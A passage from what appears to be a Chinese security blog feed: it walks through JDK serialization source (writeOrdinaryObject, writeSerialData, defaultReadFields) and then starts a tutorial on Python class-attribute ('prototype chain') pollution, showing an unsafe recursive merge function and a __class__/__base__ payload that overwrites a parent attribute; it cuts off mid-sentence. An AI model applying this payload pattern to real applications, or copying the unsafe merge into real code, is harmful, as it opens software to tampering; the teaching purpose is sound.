class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>① lookup 函数用于查找当前类的 ObjectStreamClass ，它是用于描述一个类的结构信息的，通过它就可以获取对象及其对象属性的相关信息，并且它内部持有该对象的父类的 ObjectStreamClass 实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">ObjectStreamClass</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; cl)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.cl = cl;</span><br><span class="line">    name = cl.getName();</span><br><span class="line">    isProxy = Proxy.isProxyClass(cl);</span><br><span class="line">    isEnum = Enum.class.isAssignableFrom(cl);</span><br><span class="line">    serializable = Serializable.class.isAssignableFrom(cl);</span><br><span class="line">    externalizable = Externalizable.class.isAssignableFrom(cl);</span><br><span class="line">    Class&lt;?&gt; superCl = cl.getSuperclass();</span><br><span class="line">  <span class="comment">//superDesc 表示需要序列化对象的父类的 ObjectStreamClass，如果为空，则调用 lookUp 查找</span></span><br><span class="line">    superDesc = (superCl != <span class="literal">null</span>) ? lookup(superCl, <span class="literal">false</span>) : <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//localDesc 表示自己</span></span><br><span class="line">    localDesc = <span class="built_in">this</span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>② 根据 obj 的类型去执行序列化操作，如果不符合序列化要求，那么会③位置抛出 <code>NotSerializableException</code> 异常</p><blockquote><p>在上面描述过，如果一个需要序列化的对象的某个属性没有实现序列化接口，那么就会此处抛出异常</p></blockquote><p><strong>ObjectOutputStream#writeOrdinaryObject</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeOrdinaryObject</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                                 ObjectStreamClass desc,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line">        <span class="comment">//①</span></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line">        <span class="comment">//②</span></span><br><span class="line">        writeClassDesc(desc, <span class="literal">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="literal">null</span> : obj);</span><br><span class="line">        <span class="comment">//③</span></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//④</span></span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>① 写入类的元数据，TC_OBJECT. 声明这是一个新的对象，如果写入的是一个 String 类型的数据，那么就需要 TC_STRING 这个标识</p><p>② <code>writeClassDesc</code> 方法主要作用就是自上而下(从父类写到子类，注意只会遍历那些实现了序列化接口的类)写入描述信息</p><p>③ <code>desc.isExternalizable()</code> 判断需要序列化的对象是否实现了 Externalizable 接口</p><p>④ <code>writeSerialData</code> 在没有实现 <code>Externalizable</code> 接口时，就执行这个方法</p><p><strong>ObjectOutputstream#writeSerialData</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//① </span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;<span class="comment">//②</span></span><br><span class="line">            <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">            curPut = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">&quot;custom writeObject data (class \&quot;&quot;</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);<span class="comment">//③</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>① desc.getClassDataLayout 会返回 ObjectStreamClass.ClassDataSlot[] ，我们来看看 ClassDataSlot 类，可以看到它是封装了 ObjectStreamClass 而已，所以我们就简单的认为 ① 这一步就是用于返回序列化对象及其父类的 ClassDataSlot[] 数组，我们可以从 ClassDataSlot 中获取对应 ObjectStreamClass 描述信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassDataSlot</span> &#123;</span><br><span class="line">    <span class="comment">/** class descriptor &quot;occupying&quot; this slot */</span></span><br><span class="line">    <span class="keyword">final</span> ObjectStreamClass desc;</span><br><span class="line">    <span class="comment">/** true if serialized form includes data for this slot&#x27;s descriptor */</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> hasData;</span><br><span class="line">    ClassDataSlot(ObjectStreamClass desc, <span class="type">boolean</span> hasData) &#123;</span><br><span class="line">        <span class="built_in">this</span>.desc = desc;</span><br><span class="line">        <span class="built_in">this</span>.hasData = hasData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>② 开始遍历返回的数组，hasWriteObjectMethod 表示的是要序列化这个对象是否有 writeObject 这个 private 方法，这个方法并不是任何接口的方法，而是我们手动写的</p><p><strong>注意：其实这个过程不像实现 Externalizable 接口那样，自己完全去自定义序列化数据</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">//执行 JVM 默认的序列化操作</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    <span class="comment">//手动序列化 arr  前面30个元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">        s.writeObject(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>③ defaultWriteFields 这个方法就是 JVM 自动帮我们序列化了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line"> </span><br><span class="line">    desc.checkDefaultSerialize();</span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);</span><br><span class="line">    <span class="comment">//①</span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    desc.getObjFieldValues(obj, objVals);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//②</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.push(</span><br><span class="line">                <span class="string">&quot;field (class \&quot;&quot;</span> + desc.getName() + <span class="string">&quot;\&quot;, name: \&quot;&quot;</span> +</span><br><span class="line">                fields[numPrimFields + i].getName() + <span class="string">&quot;\&quot;, type: \&quot;&quot;</span> +</span><br><span class="line">                fields[numPrimFields + i].getType() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeObject0(objVals[i],</span><br><span class="line">                         fields[numPrimFields + i].isUnshared());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法主要分为以下两步</p><ul><li>① 写入基本数据类型的数据</li><li>②写入引用数据类型的数据，这里最终又调用到了 <code>writeObject0()</code> 方法，读者可以返回到上面去看看具体的实现</li></ul><h2 id="readObject-原理分析"><a href="#readObject-原理分析" class="headerlink" title="readObject 原理分析"></a>readObject 原理分析</h2><p>从流中读取类的描述信息 <code>ObjectStreamClass</code> 实例，通过这个对象就可以创建出序列化的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br><span class="line">...</span><br><span class="line">  Object obj;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">//创建对应反序列化的对象</span></span><br><span class="line">    obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">        desc.forClass().getName(),</span><br><span class="line">        <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取该对象及其对象的父类的 <code>ObjectStreamClass</code>信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br></pre></td></tr></table></figure><p>然后遍历得到每一个 <code>ObjectStreamClass</code> 对象，将对应的属性值赋值给需要反序列化的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultReadFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    bin.readFully(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        desc.setPrimFieldValues(obj, primVals);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">objHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    <span class="comment">//从 ObjectStreamClass 中得到对象的所有 Field 信息</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[numPrimFields + i];</span><br><span class="line">        objVals[i] = readObject0(f.isUnshared());</span><br><span class="line">        <span class="keyword">if</span> (f.getField() != <span class="literal">null</span>) &#123;</span><br><span class="line">            handles.markDependency(objHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">//将数据保存到对象中去</span></span><br><span class="line">        desc.setObjFieldValues(obj, objVals);</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = objHandle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python原型链污染</title>
      <link href="/2023/08/06/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/08/06/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h1><blockquote><p>Python 中的原型链污染（Prototype Pollution）是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术。<br>在 Python中，对象的属性和方法可以通过原型链继承来获取。每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等</p></blockquote><h1 id="污染条件"><a href="#污染条件" class="headerlink" title="污染条件"></a>污染条件</h1><p>和js原型链污染差不多，原型链污染需要merge合并函数，通过递归合并来修改父级属性，CTF中常见的merge函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):  <span class="comment">#src为原字典，dst为目标字典</span></span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):  <span class="comment">#键值对字典形式</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))  <span class="comment">#递归到字典最后一层</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  <span class="comment">#class形式</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))  <span class="comment">#递归到最终的父类</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><h1 id="污染过程"><a href="#污染过程" class="headerlink" title="污染过程"></a>污染过程</h1><p>感觉和之前学的flask的模板注入过程差不多，都是通过属性和方法的一层层调用，从而实现属性的修改</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>执行<code>merge</code>函数后，因为<code>instance</code>是对象类型，并且含有<code>__class__</code>默认属性，并且<code>v</code>也为字典格式，故执行这条判断语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span></span><br><span class="line">merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">src=&#123;</span></span><br><span class="line"><span class="string">    &quot;__class__&quot; : &#123;</span></span><br><span class="line"><span class="string">        &quot;__base__&quot; : &#123;</span></span><br><span class="line"><span class="string">            &quot;secret&quot; : &quot;world&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">dst=instance()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>接着进行第一次递归，执行语句<code>merge(v, getattr(dst, k))</code>，此时合并目标通过<code>__class__</code>属性换成了instance对象的所属的类<code>son_b</code>，然后再次通过一下判断语句进行第二次递归</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">src=&#123;</span></span><br><span class="line"><span class="string">        &quot;__base__&quot; : &#123;</span></span><br><span class="line"><span class="string">            &quot;secret&quot; : &quot;world&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">dst=son_b()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>第二次递归之后，执行语句<code>merge(v, getattr(dst, k))</code>，此时合并目标通过<code>__base__</code>属性换成了<code>son_b</code>类的所属的直接父类<code>father</code>，然后进行第三次递归</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">src=&#123;&quot;secret&quot; : &quot;world&quot;&#125;</span></span><br><span class="line"><span class="string">dst=father()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>第三次递归时，<code>type(v) == 